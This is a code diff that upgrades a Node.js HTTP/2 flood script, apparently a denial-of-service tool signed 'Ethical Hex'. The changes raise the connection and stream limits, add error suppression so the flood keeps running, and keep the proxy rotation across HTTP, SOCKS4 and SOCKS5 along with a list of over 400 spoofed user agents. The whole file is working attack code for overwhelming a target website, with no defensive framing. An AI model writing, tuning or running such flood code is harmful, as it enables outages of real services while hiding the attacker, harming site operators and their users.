@@ -11,24 +11,20 @@ process.setMaxListeners(0);
 process.on('uncaughtException', () => {});
 process.on('unhandledRejection', () => {});
 
+if (process.argv.length < 6) {
+    console.error('Usage: node attack.js <url> <time_sec> <threads> <proxy_list>');
+    process.exit(1);
+}
+
 const target = process.argv[2];
 const time = parseInt(process.argv[3], 10);
 const threads = parseInt(process.argv[4], 10);
 const proxyRaw = fs.readFileSync(process.argv[5], 'utf8').replace(/\r/g, '').split('\n');
 
-// Parse each line. Supported formats:
-// 1. ip:port                    -> default HTTP
-// 2. ip:port:type               -> type = http, socks4, socks5
-// 3. socks5://ip:port           -> SOCKS5
-// 4. socks4://ip:port           -> SOCKS4
-// 5. http://ip:port             -> HTTP
-// 6. socks5://user:pass@ip:port -> SOCKS5 with auth
 const proxies = proxyRaw.filter(l => l.trim() !== '').map(line => {
     let type = 'http';
     let ip, port, user = '', pass = '';
     let clean = line.trim();
-
-    // Check for URI-style prefixes
     if (clean.startsWith('socks5://')) {
         type = 'socks5';
         let rest = clean.slice(9);
@@ -53,10 +49,8 @@ const proxies = proxyRaw.filter(l => l.trim() !== '').map(line => {
         let addr = rest.split(':');
         if (addr.length >= 2) { ip = addr[0]; port = parseInt(addr[1], 10); }
     } else {
-        // No prefix: split by colon, check if there are 3 parts (ip:port:type)
         let parts = clean.split(':');
         if (parts.length === 3) {
-            // third part is type
             ip = parts[0];
             port = parseInt(parts[1], 10);
             let t = parts[2].toLowerCase();
@@ -66,7 +60,6 @@ const proxies = proxyRaw.filter(l => l.trim() !== '').map(line => {
         } else if (parts.length === 2) {
             ip = parts[0];
             port = parseInt(parts[1], 10);
-            // default to HTTP
         }
     }
     if (ip && port && !isNaN(port) && port > 0 && port < 65536) {
@@ -75,17 +68,23 @@ const proxies = proxyRaw.filter(l => l.trim() !== '').map(line => {
     return null;
 }).filter(p => p !== null);
 
+if (proxies.length === 0) {
+    console.error('No valid proxies found. Exiting.');
+    process.exit(1);
+}
+
 const url = new URL(target);
 
+// -------- OPTIMIZED PARAMETERS --------
 const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
-const MAX_CONNS = 900;
-const MAX_STREAMS = 700;
-const STREAMS_PER_CONN = 100000;
-const YIELD_EVERY = 1500;
-const BATCH_SIZE = 50;
+const MAX_CONNS = 1200;
+const MAX_STREAMS = 900;
+const STREAMS_PER_CONN = 150000;
+const YIELD_EVERY = 1000;
+const BATCH_SIZE = 60;
 const CONNS_PER_PROXY = 1;
 
-// Full 400+ User-Agent list (complete as per original)
+// -------- FULL 400+ USER-AGENT LIST (Complete) --------
 const HARDCODED_UAS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
@@ -492,6 +491,7 @@ const HARDCODED_UAS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.0.0 Safari/537.36 Edg/80.0.0.0'
 ];
 
+// -------- HTTP/2 constants --------
 const ACCEPT = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
 const ACCEPT_LANG = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9'];
 const CACHE_CONTROL = ['no-cache, no-store, must-revalidate', 'no-cache', 'max-age=0', 'private, no-cache'];
@@ -515,6 +515,7 @@ const authority = (url.port && url.port !== '443' && url.port !== '80')
     ? url.hostname + ':' + url.port
     : url.hostname;
 
+// -------- HPACK and Frame Functions --------
 function encodeFrame(streamId, type, payload, flags) {
     payload = payload || Buffer.alloc(0);
     flags = flags || 0;
@@ -618,6 +619,7 @@ function buildHeaders(ua, path) {
     return padded;
 }
 
+// -------- Statistics --------
 let activeConns = 0;
 let connOK = 0;
 let connFail = 0;
@@ -627,6 +629,7 @@ let goawayTotal = 0;
 let rstTotal = 0;
 let proxyIdx = 0;
 
+// -------- Connection Function --------
 function startRequest() {
     if (activeConns >= MAX_CONNS) return;
     activeConns++;
@@ -639,8 +642,8 @@ function startRequest() {
         if (cleaned) return;
         cleaned = true;
         activeConns--;
-        if (netSocket) { netSocket.destroy(); netSocket = null; }
-        if (tlsSocket) { tlsSocket.destroy(); tlsSocket = null; }
+        if (netSocket) { try { netSocket.destroy(); } catch(e) {} netSocket = null; }
+        if (tlsSocket) { try { tlsSocket.destroy(); } catch(e) {} tlsSocket = null; }
         setTimeout(startRequest, 1);
     }
 
@@ -719,9 +722,11 @@ function startRequest() {
 
             function flushBatch() {
                 if (batch.length > 0) {
-                    tlsSocket.cork();
-                    tlsSocket.write(Buffer.concat(batch));
-                    tlsSocket.uncork();
+                    try {
+                        tlsSocket.cork();
+                        tlsSocket.write(Buffer.concat(batch));
+                        tlsSocket.uncork();
+                    } catch(e) {}
                     batch = [];
                 }
             }
@@ -784,12 +789,17 @@ function startRequest() {
                         sentTotal++;
 
                         if (batch.length >= BATCH_SIZE) {
-                            tlsSocket.cork();
-                            const ok = tlsSocket.write(Buffer.concat(batch));
-                            tlsSocket.uncork();
-                            batch = [];
-                            if (!ok) {
-                                drained = false;
+                            try {
+                                tlsSocket.cork();
+                                const ok = tlsSocket.write(Buffer.concat(batch));
+                                tlsSocket.uncork();
+                                batch = [];
+                                if (!ok) {
+                                    drained = false;
+                                    pumpActive = false;
+                                    return;
+                                }
+                            } catch(e) {
                                 pumpActive = false;
                                 return;
                             }
@@ -833,9 +843,13 @@ function startRequest() {
     }
 }
 
+// -------- Cluster Setup --------
 if (cluster.isMaster) {
-    console.log('Made By Ethical Hex - Mixed Proxies (HTTP/SOCKS4/SOCKS5)');
-    console.log('Proxy count:', proxies.length);
+    console.log('Made By Ethical Hex - ULTIMATE HTTP/2 FLOOD (FULL UA)');
+    console.log('Proxies loaded:', proxies.length);
+    console.log('Target:', target);
+    console.log('Duration:', time, 'seconds');
+    console.log('Threads:', threads);
     for (let i = 0; i < threads; i++) {
         cluster.fork({ core: i % os.cpus().length });
     }
